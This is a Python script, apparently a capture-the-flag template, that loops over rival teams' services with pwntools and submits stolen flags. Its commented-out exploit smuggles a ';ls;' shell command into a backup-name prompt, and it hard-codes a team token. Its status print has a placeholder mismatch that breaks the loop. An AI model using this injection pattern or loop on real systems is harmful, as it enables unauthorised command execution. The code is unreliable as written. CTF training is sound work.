#!/usr/bin/env python3
import swpag_client
import pwn

TEAM_IP = "52.37.204.0"                             # Update according to team ip address
TEAM_FLAG_TOKEN = "ZOGR9UqlRWFg8wLJB3aj"            # Update according to team flag token
SERVICE_ID = 1                                      # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Bindevil"                      # Team name
EXCLUDE_HOSTNAME = "team19"                         # Team hostname
TEAM_URL = "http://" + TEAM_IP + "/"
SERVICE_PORT = 10001                                # Exploiting service's port

def main():
  try:
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
    for target in team.get_targets(SERVICE_ID):
      flag_id = target["flag_id"]
      hostname = target["hostname"]
                
      # Ignore our own team
      if target["team_name"] == EXCLUDE_TEAM_NAME or hostname == EXCLUDE_HOSTNAME:
        continue

      print("Running exploit on {0}:{1} -> {2}".format(hostname, flag_id))

      # Try to connect to target vm, if fail, continue
      try:
          r = pwn.remote(target["hostname"], SERVICE_PORT)
      except Exception as e:
         print(e)
         continue
      
      # Do the exploitation here
      # print(r.recvuntil("Exit.\n> "))
      # r.send("2\n")
      # print(r.recvuntil("backup: "))
      # r.send("name\n")
      # print(r.recvuntil("backup: "))
      # r.send(";ls;\n")
      # a = r.recvall(timeout=2)
      # r.close()
      
      # Process the data to find flag id here
      # a = str(a)
      # a = a.split("\\n")
      # print("num lines", len(a))
      good_flag = []
      # for line in a:
      #   if "_FLG" in line:
      #     parts = line.split("_")
      #     flag = parts[1].split(".")[0]
      #     if flag:
      #       print(flag)
      #       good_flag.append(flag)
      
      # Submit flag
      # Do not bulk upload flag, if too many incorrect flags, the server will drop 
      # all the remained flags
      for flag in good_flag:
          print(team.submit_flag([flag])) 
  except Exception as e:
    print(e)

if __name__ == "__main__":
  main()
